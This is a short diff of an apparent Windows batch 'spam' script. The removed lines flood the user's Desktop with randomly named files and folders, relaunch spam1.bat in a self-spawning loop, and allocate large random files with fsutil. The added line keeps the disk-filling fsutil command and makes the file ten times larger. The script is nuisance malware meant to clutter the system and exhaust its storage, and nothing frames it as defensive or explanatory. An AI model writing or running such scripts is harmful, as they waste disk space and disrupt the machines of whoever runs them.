@@ -1,5 +1,2 @@
-echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %USERPROFILE%\Desktop\%random%.txt
-start spam1.bat
-fsutil file createnew %random% %random%0000
-MD %USERPROFILE%\Desktop\%random%
+fsutil file createnew %random% %random%00000
 exit
